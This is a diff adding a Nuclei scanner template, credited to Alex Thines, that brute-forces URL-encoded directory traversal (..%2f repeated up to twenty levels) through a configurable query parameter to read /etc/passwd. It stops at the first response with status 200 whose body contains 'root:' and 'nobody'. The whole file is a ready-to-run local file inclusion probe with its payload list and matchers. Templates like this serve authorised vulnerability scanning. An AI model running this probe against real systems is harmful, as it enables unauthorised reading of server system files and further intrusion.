@@ -1,0 +1,65 @@
+id: lfi-traversal-encoded-bruteforce
+
+info:
+  name: URL-encoded directory traversal brute force (..%2f up to 20)
+  author: Alex Thines (Sparky23172)
+  severity: high
+  description: |
+    Brute-forces URL-encoded traversal sequences to probe for /etc/passwd.
+    Stops at first hit where HTTP 200 and both "root" and "nobody" appear.
+  tags: lfi,traversal,bruteforce
+
+# Customize this if the vulnerable endpoint needs a prefix, e.g.
+# endpoint: "/download?file="
+variables:
+  endpoint: "?v="
+
+requests:
+  - method: GET
+    # If your target needs a param-style path, set endpoint accordingly, e.g.
+    # -var endpoint="/download?file="
+    path:
+      - "{{BaseURL}}{{endpoint}}{{depth}}etc%2fpasswd"
+
+    # Try deeper traversal first or last—order here goes shallow->deep.
+    # Nuclei will stop early when the matcher hits (stop-at-first-match: true).
+    payloads:
+      depth:
+        - "..%2f"
+        - "..%2f..%2f"
+        - "..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+
+    # If the app returns 302 to a readable page, you can enable:
+    redirects: true
+    max-redirects: 2
+    pipeline: true
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        condition: and
+        words:
+          - "root:"
+          - "nobody"
+        part: body
